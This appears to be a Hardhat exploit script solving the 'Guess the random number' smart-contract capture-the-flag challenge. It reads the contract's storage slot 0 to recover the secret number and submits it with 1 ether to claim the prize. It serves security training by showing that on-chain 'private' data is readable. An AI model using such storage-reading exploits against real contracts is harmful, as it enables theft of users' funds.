import { utils } from "ethers";
import { ethers } from "hardhat";

const contractAddress = "0x333A270EE190fe4f06aaA35c8b2bd3529Fbf52E4";

async function main() {
  const factory = await ethers.getContractFactory("GuessTheRandomNumberChallenge");
  const contract = factory.attach(contractAddress);

  const secretNumber = await contract.provider.getStorageAt(contract.address, 0);
  const tx = await contract.guess(secretNumber, { value: utils.parseEther("1") });
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
